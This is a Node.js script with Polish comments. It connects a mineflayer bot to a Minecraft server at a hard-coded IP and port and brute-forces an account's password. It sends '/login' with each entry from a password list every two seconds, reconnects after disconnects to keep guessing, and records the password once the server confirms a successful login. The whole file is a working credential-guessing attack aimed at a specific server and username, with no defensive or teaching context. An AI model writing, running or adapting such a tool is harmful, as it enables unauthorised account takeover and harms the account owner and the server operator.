const mineflayer = require('mineflayer');
const fs = require('fs');

const host = '51.77.41.194'; // Adres serwera Minecraft
const port = 30205; // Port serwera Minecraft
const username = '_hyperek_'; // Nick bota
const version = '1.19.4'; // Określona wersja Minecrafta, dopasowana do serwera
const passwords = fs.readFileSync('passwords.txt', 'utf-8').split('\n').map(p => p.trim());
const successPhrases = fs.readFileSync('information.txt', 'utf-8').split('\n').map(p => p.trim());
const logFile = 'logs.txt';

// Funkcja logująca informacje do pliku logs.txt
function logToFile(message) {
    const logMessage = `[${new Date().toISOString()}] ${message}\n`;
    fs.appendFileSync(logFile, logMessage);
}

// Czyszczenie pliku logs.txt na start
fs.writeFileSync(logFile, '');
logToFile('Bot uruchomiony');

let successfulPassword = '';
let currentPassword = '';
let lastPasswordIndex = 0;
let canSendMessages = true;

function createBot() {
    const bot = mineflayer.createBot({ host, port, username, version });

    bot.isConnected = false;

    bot.on('login', () => {
        bot.isConnected = true;
        console.log('Połączono z serwerem');
        logToFile('Połączono z serwerem');
        setTimeout(() => {
            setTimeout(() => {
                attemptLogin(bot, lastPasswordIndex);
            }, 1000); // Czekaj 1 sekundę przed rozpoczęciem działań po połączeniu
        }, 7000); // Czekaj 7 sekund po wejściu na serwer
    });

    bot.on('chat', (username, message) => {
        if (!bot.isConnected || !canSendMessages) return;
        const logMessage = `[${new Date().toISOString()}] ${username}: ${message}`;
        console.log(logMessage);
        logToFile(logMessage);
    });

    bot.on('message', (jsonMsg) => {
        if (!bot.isConnected) return;
        const message = jsonMsg.toString();
        console.log(`Wiadomość od serwera: ${message}`);
        
        if (message.includes("Zalogowano!")) {
            console.log("Bot został zalogowany!");
            logToFile("Bot pomyślnie zalogowany!");
            successfulPassword = currentPassword; // Ustawienie hasła jako poprawne
            canSendMessages = false; // Zatrzymanie wysyłania wiadomości
        }
    });

    bot.on('error', (err) => {
        const errorMessage = `Błąd: ${err.message}`;
        console.error(errorMessage);
        logToFile(errorMessage);
    });

    bot.on('end', () => {
        bot.isConnected = false;
        console.log('Bot rozłączony');
        logToFile('Bot rozłączony');
        fs.writeFileSync(logFile, ''); // Czyszczenie pliku logs.txt po rozłączeniu
        setTimeout(createBot, 5000); // Ponowne połączenie po 5 sekundach
    });

    return bot;
}

function attemptLogin(bot, index) {
    if (index >= passwords.length || successfulPassword) {
        return;
    }

    if (!bot.isConnected) return;

    lastPasswordIndex = index;
    currentPassword = passwords[index];
    const loginMessage = `Próba logowania: /login ${currentPassword}`;
    console.log(loginMessage);
    logToFile(loginMessage);
    bot.chat(`/login ${currentPassword}`);
    
    setTimeout(() => {
        if (!successfulPassword) {
            attemptLogin(bot, index + 1);
        }
    }, 2000);
}

createBot();
